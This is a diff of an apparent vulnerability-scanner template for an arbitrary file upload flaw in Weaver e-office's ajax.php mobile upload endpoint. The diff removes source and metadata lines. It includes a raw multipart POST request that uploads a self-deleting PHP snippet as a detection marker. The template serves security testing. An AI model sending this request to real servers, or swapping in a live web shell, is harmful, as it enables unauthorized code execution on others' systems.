@@ -3,12 +3,8 @@ info:
   name: 泛微e-office系统ajax.php接口 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zx9u25ro9mox4p7t'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zx9u25ro9mox4p7t
-    fofa: app="泛微-EOffice"
 http:
 - raw:
   - 'POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
@@ -41,8 +37,6 @@ http:
     Connection: close
 
 
-
-
     --c2307d1cd1165cfacd8cd7c008f44d1e
 
 
@@ -50,8 +44,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <?php echo "12321";unlink(__FILE__); ?>
@@ -64,10 +56,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
-
-
 
 
     --c2307d1cd1165cfacd8cd7c008f44d1e--
